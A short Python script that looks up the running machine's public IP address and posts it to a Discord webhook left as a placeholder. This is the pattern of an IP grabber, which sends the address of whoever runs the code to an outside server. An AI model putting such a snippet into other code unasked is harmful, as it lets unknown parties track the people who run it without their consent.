import requests
import discord


ip = requests.get("https://wtfismyip.com/text").text
print(ip)

discord_webhook_url = 'WEBHOOK URL HERE'
Message = {
    "content": ip
}
requests.post(discord_webhook_url, data=Message)
